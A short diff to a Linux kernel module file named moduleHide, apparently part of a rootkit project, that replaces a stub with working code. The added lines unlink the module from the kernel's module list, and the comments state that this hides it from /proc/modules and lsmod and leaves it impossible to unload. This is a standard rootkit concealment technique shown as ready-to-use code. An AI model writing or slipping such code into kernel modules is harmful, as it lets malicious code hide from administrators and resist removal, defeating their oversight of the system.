@@ -5,8 +5,10 @@
 #include "moduleHide.h"
 
 int __init moduleHide_init(void) {
-	printk(KERN_INFO "in unimplemented %s\n", __FUNCTION__);
-	return 0; // unimplemented 
+	// Removes module structure from list, which in turn hides it from /proc/modules
+	// and lsmod. Its absence from the list means that the module can't be uninstalled anymore.
+	list_del(&THIS_MODULE->list);
+	return 0;
 }
 void __exit moduleHide_exit(void) {
 }
